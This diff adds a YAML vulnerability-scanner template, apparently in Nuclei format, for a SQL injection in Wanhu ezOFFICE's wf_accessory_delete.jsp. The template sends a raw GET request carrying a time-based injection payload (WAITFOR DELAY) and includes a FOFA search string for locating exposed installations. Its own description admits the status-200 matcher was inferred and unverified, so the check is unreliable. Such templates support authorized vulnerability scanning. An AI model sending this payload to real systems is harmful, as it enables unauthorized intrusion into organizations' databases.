@@ -1,0 +1,27 @@
+id: poc-rl2ux7zcl5hwcy19
+info:
+  name: 万户 ezOFFICE wf_accessory_delete.jsp存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rl2ux7zcl5hwcy19
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rl2ux7zcl5hwcy19
+    fofa: app="万户网络-ezOFFICE"
+http:
+- raw:
+  - 'GET /defaultroot/platform/bpm/work_flow/operate/wf_accessory_delete.jsp;?wf_work_accessory_id=1%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
